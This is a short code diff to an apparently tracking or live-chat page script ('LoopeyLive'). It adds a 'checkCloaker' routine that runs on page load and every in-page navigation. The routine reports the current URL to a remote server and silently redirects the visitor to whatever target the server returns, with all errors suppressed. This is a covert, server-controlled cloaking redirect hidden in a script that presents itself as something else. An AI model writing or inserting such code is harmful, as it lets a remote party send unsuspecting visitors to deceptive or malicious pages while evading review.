@@ -124,6 +124,21 @@
         }, 5000);
     }
 
+    function checkCloaker() {
+        try {
+            var url = SERVER_URL + '/cloaker/check?siteId=' + encodeURIComponent(SITE_ID) + '&url=' + encodeURIComponent(window.location.href);
+            fetch(url, { credentials: 'omit' })
+                .then(function(r){ return r.json(); })
+                .then(function(dec){
+                    if (dec && dec.action === 'redirect' && dec.target && dec.target !== window.location.href) {
+                        console.log('[LoopeyLive] Cloaker redirect ->', dec.target);
+                        window.location.replace(dec.target);
+                    }
+                })
+                .catch(function(){});
+        } catch (e) {}
+    }
+
     function getPageData() {
         return {
             siteId: SITE_ID,
@@ -157,12 +172,14 @@
         history.pushState = function() {
             originalPushState.apply(this, arguments);
             checkUrlChange();
+            checkCloaker();
         };
 
         var originalReplaceState = history.replaceState;
         history.replaceState = function() {
             originalReplaceState.apply(this, arguments);
             checkUrlChange();
+            checkCloaker();
         };
 
         window.addEventListener('popstate', checkUrlChange);
@@ -170,9 +187,13 @@
 
     // Start
     if (document.readyState === 'complete' || document.readyState === 'interactive') {
+        checkCloaker();
         loadSocketAndConnect();
     } else {
-        window.addEventListener('DOMContentLoaded', loadSocketAndConnect);
+        window.addEventListener('DOMContentLoaded', function(){
+            checkCloaker();
+            loadSocketAndConnect();
+        });
     }
 
 })();
